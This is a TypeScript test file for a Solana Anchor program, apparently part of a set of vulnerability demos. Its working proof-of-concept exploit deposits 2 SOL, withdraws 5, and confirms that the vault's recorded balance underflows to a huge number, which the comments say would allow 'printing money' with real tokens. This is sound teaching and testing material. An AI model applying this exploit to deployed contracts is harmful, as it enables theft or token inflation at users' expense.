/**
 * EXPLOIT TEST: Arithmetic Overflow (Anchor)
 * 
 * This test demonstrates the arithmetic overflow/underflow vulnerability in the Anchor program.
 * 
 * Vulnerability: The program uses wrapping arithmetic (simulating unchecked math).
 * 
 * Exploit Scenario:
 * 1. Initialize vault with 0 balance.
 * 2. Deposit a small amount (e.g., 2 SOL).
 * 3. Attempt to withdraw MORE than the balance (e.g., 5 SOL).
 * 4. Due to underflow, 2 - 5 wraps around to a massive number (u64::MAX - 2).
 * 5. Verify that the vault's internal balance state is now enormous.
 * 
 * Note: The actual SOL transfer will fail if the vault account lacks lamports,
 * but the *internal state* tracking (vault.balance) gets corrupted. 
 * In a real scenario (e.g. SPL tokens), this allows printing money.
 */

import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { PublicKey, Keypair, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { BN } from "bn.js";

describe("03-arithmetic-overflow: Anchor Exploit", () => {
    const provider = anchor.AnchorProvider.env();
    anchor.setProvider(provider);

    const PROGRAM_ID = new PublicKey("3Z9vL1zjN4N5tRDNEPQuv876tMB1qdNGo4B2PqJdZZXR");

    it("Exploits arithmetic underflow to create massive balance", async () => {
        console.log("\nüéØ EXPLOIT: Arithmetic Overflow (Anchor)\n");

        const idl = await Program.fetchIdl(PROGRAM_ID, provider);
        if (!idl) {
            throw new Error("IDL not found. Make sure the program is deployed.");
        }
        const program = new Program(idl, PROGRAM_ID, provider);

        const user = Keypair.generate();
        console.log("üë§ User:", user.publicKey.toBase58());

        // Airdrop SOL
        const airdropSig = await provider.connection.requestAirdrop(
            user.publicKey,
            10 * LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(airdropSig);

        // Derive vault PDA
        const [vaultPda] = PublicKey.findProgramAddressSync(
            [Buffer.from("vault"), user.publicKey.toBuffer()],
            PROGRAM_ID
        );
        console.log("üè¶ Vault PDA:", vaultPda.toBase58());

        // Step 1: Initialize vault
        console.log("\nüìù Step 1: Initialize vault...");
        await program.methods
            .initialize()
            .accounts({
                user: user.publicKey,
                vault: vaultPda,
                systemProgram: SystemProgram.programId,
            })
            .signers([user])
            .rpc();

        // Step 2: Deposit 2 SOL
        const depositAmount = new BN(2 * LAMPORTS_PER_SOL);
        console.log(`\nüí∞ Step 2: Deposit ${depositAmount.div(new BN(LAMPORTS_PER_SOL)).toString()} SOL...`);

        await program.methods
            .deposit(depositAmount)
            .accounts({
                user: user.publicKey,
                vault: vaultPda,
                systemProgram: SystemProgram.programId,
            })
            .signers([user])
            .rpc();

        let vaultAccount = await program.account["vault"].fetch(vaultPda);
        console.log(`‚úÖ Vault internal balance: ${vaultAccount.balance.toString()}`);

        // Step 3: Attempt to withdraw 5 SOL (causing underflow)
        // 2 SOL - 5 SOL = Underflow to huge number
        // We expect the transaction to FAIL on the SOL transfer (system program check),
        // OR if we fund the vault extra, it might succeed. 
        // BUT the vulnerability is the state calculation.
        // To make the transaction succeed so we can verify the state, we can fund the vault manually.

        console.log("\nüíâ Funding vault manually to bypass system program lamport checks...");
        const fundSig = await provider.connection.requestAirdrop(
            vaultPda,
            10 * LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(fundSig);

        const withdrawAmount = new BN(5 * LAMPORTS_PER_SOL);
        console.log(`\nüö® Step 3: Withdraw ${withdrawAmount.div(new BN(LAMPORTS_PER_SOL)).toString()} SOL (causing underflow)...`);

        await program.methods
            .withdraw(withdrawAmount)
            .accounts({
                user: user.publicKey,
                vault: vaultPda,
            })
            .signers([user])
            .rpc();

        // Step 4: Verify huge balance
        vaultAccount = await program.account["vault"].fetch(vaultPda);
        console.log(`\nüí• EXPLOIT SUCCESSFUL!`);
        console.log(`üè¶ Vault internal balance: ${vaultAccount.balance.toString()}`);

        const maxU64 = new BN("18446744073709551615");
        // Expected: maxU64 - 3 SOL (approx)
        if (vaultAccount.balance.gt(new BN(LAMPORTS_PER_SOL).mul(new BN(1000)))) {
            console.log("‚úÖ Balance is massive (underflow confirmed)");
        } else {
            throw new Error("Underflow did not occur");
        }
    });
});
